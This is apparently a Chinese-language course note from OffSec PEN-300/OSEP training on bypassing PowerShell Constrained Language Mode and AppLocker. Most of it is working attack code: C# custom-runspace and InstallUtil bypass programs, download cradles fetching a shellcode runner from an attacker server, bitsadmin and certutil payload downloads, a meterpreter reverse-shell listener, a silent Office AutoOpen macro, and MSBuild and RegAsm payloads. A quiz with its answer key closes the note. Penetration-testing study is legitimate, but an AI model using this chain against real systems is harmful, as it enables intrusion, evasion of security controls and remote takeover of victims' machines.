---
title: OSEP-09-PowerShell绕过
description: '09-应用白名单绕过 | 04-PowerShell绕过'
pubDate: 2026-01-30T00:01:31+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - PowerShell
---

# Module 09: 应用白名单绕过

## 第三节：PowerShell 受限语言模式绕过

### 为什么要绕过 CLM？

我们之前开发的很多技术都依赖 PowerShell：
- Shellcode Runner
- 下载摇篮
- 反射式加载

在受限语言模式下，这些技术都无法使用。

---

## 一、自定义 Runspace 绕过

### 1.1 原理

PowerShell.exe 只是一个前端，真正的功能在 `System.Management.Automation.dll` 中。

我们可以：
1. 创建自己的 C# 程序
2. 直接调用 PowerShell 引擎
3. 创建不受限制的 Runspace

```
PowerShell.exe (受 AppLocker 限制)
        │
        ▼
System.Management.Automation.dll
        │
        ▼
自定义 Runspace (不受 CLM 限制!)
```

### 1.2 C# 代码实现

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // 创建自定义 Runspace
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            // 创建 PowerShell 对象
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            // 添加要执行的脚本
            String cmd = "$ExecutionContext.SessionState.LanguageMode";
            ps.AddScript(cmd);

            // 执行并获取结果
            var results = ps.Invoke();
            foreach (var result in results)
            {
                Console.WriteLine(result);  // 输出: FullLanguage
            }

            rs.Close();
        }
    }
}
```

### 1.3 执行 Shellcode Runner

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            // 下载并执行 PowerShell shellcode runner
            String cmd = @"
                IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/runner.ps1')
            ";

            ps.AddScript(cmd);
            ps.Invoke();

            rs.Close();
        }
    }
}
```

### 1.4 编译注意事项

1. 添加引用：`System.Management.Automation.dll`
   - 位置：`C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35`

2. 编译为 64 位

3. 复制到可写目录执行

---

## 二、InstallUtil 绕过

### 2.1 原理

`InstallUtil.exe` 是 .NET Framework 自带的工具，用于安装/卸载程序集。

关键点：
- 位于白名单目录
- 可以执行程序集中的 `Uninstall` 方法
- `Uninstall` 方法不需要管理员权限

### 2.2 代码结构

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // Main 方法是诱饵，不会被 InstallUtil 执行
            Console.WriteLine("This is a decoy");
        }
    }

    // 这个类会被 InstallUtil 调用
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        // Uninstall 方法会被执行
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // 在这里放置恶意代码
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/runner.ps1')";
            ps.AddScript(cmd);
            ps.Invoke();

            rs.Close();
        }
    }
}
```

### 2.3 执行方法

```cmd
:: 使用 InstallUtil 执行 Uninstall 方法
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\Bypass.exe

:: 参数说明
:: /logfile=         不写日志文件
:: /LogToConsole=false  不输出到控制台
:: /U                调用 Uninstall 方法
```

---

## 三、完整攻击链

### 3.1 准备阶段

```bash
# 1. 在 Kali 上准备 PowerShell shellcode runner
cat > /var/www/html/runner.ps1 << 'EOF'
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Kernel32

[Byte[]] $buf = @(0xfc,0x48,0x83,0xe4)  # 实际使用时替换为完整 msfvenom shellcode

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thread = [Kernel32]::CreateThread(0,0,$addr,0,0,0)
[Kernel32]::WaitForSingleObject($thread, [uint32]::MaxValue)
EOF

# 2. 启动 Web 服务器
sudo systemctl start apache2

# 3. 启动监听器
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; run"
```

### 3.2 编译 C# Bypass

```csharp
// Bypass.cs - 完整代码
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/runner.ps1')";

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();

            rs.Close();
        }
    }
}
```

### 3.3 传输和执行

```cmd
:: 方法 1: 使用 bitsadmin 下载
bitsadmin /Transfer job http://192.168.1.100/Bypass.exe C:\Windows\Tasks\Bypass.exe

:: 方法 2: 使用 certutil 下载 (Base64 编码)
certutil -urlcache -split -f http://192.168.1.100/Bypass.txt C:\Windows\Tasks\enc.txt
certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\Bypass.exe

:: 执行
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe
```

### 3.4 结合 Office 宏

```vba
Sub AutoOpen()
    Dim cmd As String

    ' 下载、解码、执行
    cmd = "cmd /c bitsadmin /Transfer job http://192.168.1.100/Bypass.exe C:\Windows\Tasks\Bypass.exe && "
    cmd = cmd & "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe"

    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```

---

## 四、其他 LOLBins

### 4.1 MSBuild

```xml
<!-- payload.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          public class ClassExample : Task, ITask
          {
            public override bool Execute()
            {
              System.Diagnostics.Process.Start("cmd.exe");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
:: 执行
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

### 4.2 RegAsm / RegSvcs

```csharp
// 需要 COM 可见的类
[ComVisible(true)]
public class Bypass
{
    public Bypass()
    {
        // 构造函数中执行代码
    }
}
```

```cmd
:: 执行
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U Bypass.dll
```

---

## 五、章节测试

### 选择题

1. 自定义 Runspace 为什么能绕过 CLM？
   - A) 它使用不同的 PowerShell 版本
   - B) 它直接调用 PowerShell 引擎，不经过 PowerShell.exe
   - C) 它禁用了 AppLocker
   - D) 它使用管理员权限

2. InstallUtil 的 /U 参数的作用是？
   - A) 更新程序
   - B) 调用 Uninstall 方法
   - C) 以管理员运行
   - D) 静默安装

3. 以下哪个不是 LOLBin？
   - A) InstallUtil.exe
   - B) MSBuild.exe
   - C) notepad.exe
   - D) RegAsm.exe

4. 自定义 Runspace 需要引用哪个 DLL？
   - A) System.dll
   - B) System.Management.Automation.dll
   - C) PowerShell.dll
   - D) Kernel32.dll

5. InstallUtil 位于哪个目录？
   - A) C:\Windows\System32
   - B) C:\Windows\Microsoft.NET\Framework64\v4.0.30319
   - C) C:\Program Files
   - D) C:\Windows\Tasks

### 答案

1-B, 2-B, 3-C, 4-B, 5-B

---

**下一节**：[06-章节测试.md](/blog/osep/09-应用白名单绕过/06-章节测试/) - Module 10 综合测试
